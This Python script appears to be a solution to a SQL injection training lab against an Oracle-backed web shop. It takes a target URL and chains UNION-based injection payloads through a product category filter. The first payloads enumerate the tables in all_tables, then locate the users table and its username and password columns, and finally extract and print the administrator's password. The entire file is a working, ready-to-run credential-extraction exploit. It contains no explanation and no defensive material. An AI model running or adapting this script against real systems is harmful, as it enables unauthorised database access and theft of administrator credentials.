import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def perform_request(url, sql_payload):
    path = "/filter?category=Gifts"
    r = requests.get(url + path + sql_payload, verify=False)
    return r.text


def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    return users_table


def sqli_users_columns(url, users_table):
    sql_payload = f"' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '{users_table}'-- "
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column


def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = f"' UNION select {username_column}, {password_column} from {users_table}--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(
        text="administrator").parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("Looking for the users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print(f"Found the users table name: {users_table}")
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print(f"Found the username column name: {username_column}")
            print(f"Found the password column name: {password_column}")

            admin_password = sqli_administrator_cred(
                url, users_table, username_column, password_column)
            if admin_password:
                print(f"[+] The administrator password is: {admin_password}")
            else:
                print("Did not find the administrator password")
        else:
            print("Did not find the username and/or the password columns")
    else:
        print("Did not find a users table.")
